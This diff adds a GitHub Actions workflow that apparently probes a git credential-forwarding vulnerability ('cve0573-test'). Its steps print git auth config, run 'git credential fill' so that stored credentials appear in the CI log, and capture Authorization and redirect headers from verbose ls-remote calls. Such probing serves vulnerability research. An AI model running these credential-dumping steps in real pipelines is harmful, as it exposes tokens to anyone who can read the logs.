@@ -1,0 +1,17 @@
+name: credential-redirect-test
+on: workflow_dispatch
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Check what credentials git has
+        run: |
+          echo "=== All git config ==="
+          git config --list --show-origin 2>&1 | grep -i "extra\|auth\|cred" || true
+          echo "=== Test credential fill ==="
+          echo -e "protocol=https\nhost=github.com\n" | git credential fill 2>&1 || true
+          echo "=== Test if credential sent to github.com redirect ==="
+          GIT_CURL_VERBOSE=1 git ls-remote https://github.com/kimkou2024/cve0573-test.git HEAD 2>&1 | grep -iE "authorization|HTTP|location" || true
+          echo "=== Create repo with redirect ==="
+          GIT_CURL_VERBOSE=1 git ls-remote https://github.com/kimkou2024/cve0573-test 2>&1 | grep -iE "authorization|HTTP|location" || true
